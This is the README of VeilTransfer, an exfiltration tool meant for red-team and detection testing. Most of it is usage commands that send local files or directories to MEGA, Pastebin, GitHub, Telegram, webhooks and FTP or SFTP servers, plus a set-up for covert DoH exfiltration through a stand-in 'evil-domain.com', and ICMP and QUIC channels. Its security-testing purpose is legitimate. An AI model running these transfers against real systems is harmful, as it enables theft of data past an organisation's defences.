# VeilTransfer 2.0

VeilTransfer is a data exfiltration utility designed to test and enhance detection capabilities. This tool simulates real-world data exfiltration techniques used by advanced threat actors, allowing organizations to evaluate and improve their security posture. By leveraging multiple exfiltration methods such as MEGA, GitHub, SFTP, WebDAV, and more, VeilTransfer helps identify gaps in your defenses and ensures your security solutions are prepared to counter modern data breaches.

## Supported Exfiltration Methods

- MEGA
- GitHub
- Dropbox
- Telegram
- Pastebin
- WebDAV
- Webhook
- SFTP
- FTP
- DoH (DNS over HTTPS)
- QUIC
- ICMP

## MITRE ATT&CK Mapping

|ID|Techniques|
|--|---------|
|T1029|Scheduled Transfer|
|T1020|Automated Exfiltration|
|T1132.001|Data Encoding: Standard Encoding|
|T1560.002|Archive Collected Data: Archive via Library|
|T1567.001|Exfiltration Over Web Service: Exfiltration to Code Repository|
|T1567.002|Exfiltration Over Web Service: Exfiltration to Cloud Storage|
|T1567.003|Exfiltration Over Web Service: Exfiltration to Text Storage|Sites|
|T1567.004|Exfiltration Over Web Service: Exfiltration Over Webhook|
|T1048.003|Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol|
|T1048.002|Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol|

## Additional Features

### Fake Data Generation
VeilTransfer also supports generating fake data, including:

- **Indonesia Identity Card (KTP) Numbers:** Generate realistic KTP numbers and associated data.
- **Credit Card Information:** Create fake credit card details in PCI DSS format, including First Name, Last Name, CCN (Visa/MasterCard/AMEX), and Expiration Date.
- **Social Security Numbers (SSN):** Generate fake SSNs for use in simulations and testing environments.
- **Medical Records:** Generate fake medical record data in Indonesian (id) or English (en).

### Zip Data Creation
Easily create zip files for bundling and compressing data, which can then be used for exfiltration or testing different scenarios. Supports optional splitting into multiple files based on size.

## Example Use Cases
* **Red Team Operations:** Deploy VeilTransfer during red team exercises to challenge blue teams with sophisticated and realistic exfiltration scenarios.
* **Purple Teaming:** Collaborate with your defensive teams to simulate and then detect exfiltration attempts, refining both offensive and defensive tactics.
* **Security Testing:** Use VeilTransfer to validate the effectiveness of DLP, NDR, firewall, and other network security measures.

## Example Usage

### Transfer

#### Transfer a File via SFTP
This example demonstrates how to securely transfer a file to a remote server using the SFTP protocol. The file is located on the local machine, and it's transferred to the specified remote directory using SSH authentication.
```bash
veiltransfer_client transfer sftp -localPath (/path/to/file or /path/to/directory) -remoteDir /remote/path -server example.com:22 -username user -password pass
```

#### Transfer Files to a WebDAV Server
In this example, files from a local directory are uploaded to a WebDAV server. The server requires a username and password for authentication. The server parameter includes the URI scheme (https:// or http://).
```bash
veiltransfer_client transfer webdav -localPath (/path/to/file or /path/to/directory) -remoteDir /remote/path -server http://webdav.example.com:8080 -username user -password pass
```

#### Transfer Files to Mega Cloud
This example shows how to transfer files to Mega Cloud storage. The files are uploaded from a specified local directory, and the authentication is handled using the user's Mega Cloud credentials.
```bash
veiltransfer_client transfer mega -localPath (/path/to/file or /path/to/directory) -username megauser@example.com -password megasecretpassword
```

#### Transfer Files via FTP
This example, a file is uploaded to an FTP server. The file is transferred to a specific directory on the remote server. The server requires a username and password for authentication.
```bash
veiltransfer_client transfer ftp -localPath (/path/to/file or /path/to/directory) -remoteDir /remote/path -server ftp.example.com:21 -username ftpuser -password ftppassword
```

#### Upload a File to Pastebin
This example demonstrates how to upload the contents of a file to Pastebin. The content is posted to Pastebin using an API key provided by the user.
```bash
veiltransfer_client transfer pastebin -localPath (/path/to/file or /path/to/directory) -apiKey your_pastebin_api_key
```

#### Send a File to a GitHub Repository
This example shows how to push a file from the local machine to a specific GitHub repository. The file is added to the repository using the user's GitHub API token for authentication.
```bash
veiltransfer_client transfer github -localPath (/path/to/file or /path/to/directory) -repo yourusername/repository -apiKey your_github_api_token
```

#### Send a File to a Telegram Channel
This example demonstrates how to send a file to a specific Telegram channel. The file is sent using a Telegram bot API token, and the message is delivered to the specified channel ID.
```bash
veiltransfer_client transfer telegram -localPath (/path/to/file or /path/to/directory) -telegramAPI your_telegram_bot_api_token -channelID 123456789
```

#### Send Data to a Webhook URL
In this example, the contents of a file are sent to a specified Webhook URL.
```bash
veiltransfer_client transfer webhook -localPath (/path/to/file or /path/to/directory) -webhookURL https://webhook.site/your-webhook-url
```

#### Transfer Files via DoH (DNS over HTTPS)

To establish a secure data exfiltration mechanism utilizing DNS over HTTPS (DoH), the following DNS records must be configured:

1. A Record: Point test to the IP address <VeilTransfer_IP_Address>.

   test -> <VeilTransfer_IP_Address>

2. NS Record: Define a subdomain (exfil) that is managed by evil-domain.com.

   exfil -> test.evil-domain.com

The domain exfil.evil-domain.com will serve as the DNS Exfil domain.

Then, start the VeilTransfer Server in DoH mode with the following command:
```bash
veiltransfer_server doh -key ag36rjsg284nfk2g -folder /root/data/exfil
```
Note: The encryption key (-key) must be 16 or 32 characters long.

To upload files via DoH, ensure that the VeilTransfer Server is actively running in DoH mode with a valid encryption key. Then, initiate the transfer using the client command:
```bash
veiltransfer_client transfer doh -localPath /path/to/file_or_directory -key ag36rjsg284nfk2g -dnsServer exfil.evil-domain.com
```

#### Transfer Files via QUIC
To start the VeilTransfer server in QUIC mode, use the following command:
```bash
veiltransfer_server quic -cert /path/server.crt -key /path/server.key
```

Once the server is running, you can upload files or directories using:
```bash
veiltransfer_client transfer quic -localPath (/path/to/file or /path/to/directory) -server example.com:443
```

#### Transfer Files via ICMP
To enable file transfers via the ICMP protocol, start the VeilTransfer Server in ICMP mode by executing the following command:
```bash
veiltransfer_server_linux icmp -folder /path/folder
```
Once the server is active, execute the following command to transfer files or directories via ICMP:
```bash
veiltransfer_client_linux transfer icmp -localPath (/path/to/file or /path/to/directory) -server <ip address>
```

### Create Zip Files

#### Create a Simple Zip File
Creates a zip archive from a specified directory.
```bash
veiltransfer_client create-zip -localPath /path/to/directory -outputPath /path/to/output.zip
```

#### Create a Split Zip File
Creates a zip archive split into multiple parts based on the specified size.
```bash
veiltransfer_client create-zip -localPath /path/to/directory -outputPath /path/to/output.zip -splitSize 1000000
```

### Data Generator

#### Generate 100 Fake Credit Card Numbers
This example shows how to generate 100 entries of fake credit card data. The generated data will include credit card numbers, expiration dates, and associated details.
```bash
veiltransfer_client generate-fake -ccn -count 100
```

#### Generate 50 Fake Indonesian KTP Entries
This example demonstrates how to generate 50 entries of fake KTP data, which are Indonesian identity cards. The data includes personal information such as name, address, and KTP number.
```bash
veiltransfer_client generate-fake -ktp -count 50
```

#### Generate 200 Fake Social Security Numbers
The generated data includes Social Security Numbers formatted according to U.S. standards.
```bash
veiltransfer_client generate-fake -ssn -count 200
```

#### Generate 300 Fake Medical Records in English
This example demonstrates how to generate 300 fake medical records in English.
```bash
veiltransfer_client generate-fake -medical-record -count 300 -language en
```

## Contributing
Contributions to VeilTransfer are welcome! If you have ideas for new features, exfiltration methods, or improvements, please submit a pull request or open an issue on GitHub.
